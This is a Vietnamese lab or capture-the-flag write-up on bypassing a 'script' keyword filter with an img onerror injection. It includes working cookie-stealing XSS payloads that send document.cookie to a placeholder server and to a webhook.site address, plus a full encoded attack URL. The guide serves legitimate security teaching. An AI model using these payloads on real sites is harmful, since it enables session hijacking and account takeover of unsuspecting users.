# HTML Injection 3

# Thử thách về lỗi bảo mật HTML Injection

# Mục tiêu: Đọc note của nạn nhân
# Code validation
```
router.get('/search', function (req, res, next) {
    // Don't allow script keyword
    if (req.query.q.search(/script/i) > 0) {
        res.send('Hack detected');
        return;
    }
    html = 'Your search - <b>' + req.query.q + '</b> - did not match any notes.<br><br>'
    res.send(html);
});
```
# Phân tích
-  Không cho phép từ khóa `script` trong truy vấn tìm kiếm
# bypass
-  Tuy nhiên, ta có thể sử dụng các ký tự HTML để tạo ra thẻ `<script>` mà không cần từ khóa `script`.
-  Ví dụ: sử dụng các thẻ html như `svg` hoặc `img` để chèn mã JavaScript.
-  Ta có thể sử dụng các ký tự như `onerror`, `onclick`, `onload` để thực thi mã JavaScript khi sự kiện xảy ra.
-  Ví dụ: `<img src=x onerror=alert(1)>` sẽ hiển thị một thông báo cảnh báo khi hình ảnh không thể tải.
# Bước thực hiện
-  Truy cập vào đường dẫn `/search?q=<img src=x onerror=alert(1)>`
-  Khi đó, mã JavaScript sẽ được thực thi và hiển thị thông báo cảnh báo với giá trị `1`.
# Kết quả
-  Bạn sẽ thấy một thông báo cảnh báo với giá trị `1`, chứng tỏ rằng bạn đã thành công trong việc thực hiện HTML Injection.
# Lấy cookie
-  Để lấy cookie của nạn nhân, bạn có thể sử dụng mã JavaScript như sau:
```html
<img src=x onerror="fetch('http://your-server.com/steal?cookie='+document.cookie)">
```
- playload encode:
```url
https://url/search?q=%3Cimg+src%3Dx+onerror%3D%22fetch%28%27https%3A%2F%2Fwebhook.site%2F3a6cea0c-0c4b-4528-a54e-421553192587%2Fsteal3%3Fcookie%3D%27%2Bdocument.cookie%29%22%3E
```
-  Khi nạn nhân truy cập vào trang web và mã JavaScript này được thực thi, nó sẽ gửi cookie của nạn nhân đến máy chủ của bạn thông qua một yêu cầu `fetch`.
-  Bạn cần thay thế `http://your-server.com/steal` bằng URL của máy chủ mà bạn đã thiết lập để nhận cookie.
# Kết quả
-  Cookie của nạn nhân đã được gửi đến `webhook`
-  Lây được cookie của nạn nhân, ta có thể sử dụng để truy cập vào tài khoản của họ hoặc thực hiện các hành động khác trên trang web.
-  Vào developer tools của trình duyệt, vào tab Application, chọn Cookies, ta có thể thấy cookie thay cookie của nạn nhân đã được gửi đến webhook.
-  F5 để nhận cookie mới nhất
-  Vào mục `note` của nạn nhận để xem nội dung note của nạn nhân.
- Phát hiện flag của nạn nhân.
# Lưu ý
-  Đây là một ví dụ đơn giản về HTML Injection, trong thực tế có thể có những biện pháp bảo vệ khác như Content Security Policy (CSP) hoặc các bộ lọc khác để ngăn chặn việc thực thi mã JavaScript từ các thẻ HTML không an toàn.
-  Luôn luôn kiểm tra và xác thực đầu vào từ người dùng để tránh các lỗi bảo mật như HTML Injection, XSS, và các lỗ hổng khác.
-  Hãy nhớ rằng việc thực hiện các cuộc tấn công như vậy chỉ nên được thực hiện trong môi trường kiểm thử hoặc với sự cho phép của người sở hữu hệ thống. Việc tấn công vào hệ thống mà không có sự cho phép là vi phạm pháp luật và đạo đức.
# Tài liệu tham khảo
- [HTML Injection](https://owasp.org/www-community/attacks/HTML_Injection)
- [XSS (Cross-Site Scripting)](https://owasp.org/www-community/attacks/xss/)
- [Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP XSS Prevention Cheat Sheet](https://owasp.org/www-community/xss-prevention-cheat-sheet)
- [MDN Web Docs - HTML Injection](https://developer.mozilla.org/en-US/docs/Glossary/HTML_injection)
- [MDN Web Docs - Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)
- [MDN Web Docs - Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/  HTTP/CSP)   

https://note3.cyberjutsu-lab.tech/search?q=%3Cimg+src%3Dx+onerror%3D%22fetch%28%27https%3A%2F%2Fwebhook.site%2F3a6cea0c-0c4b-4528-a54e-421553192587%2Fsteal%3Fcookie%3D%27%2Bdocument.cookie%29%22%3E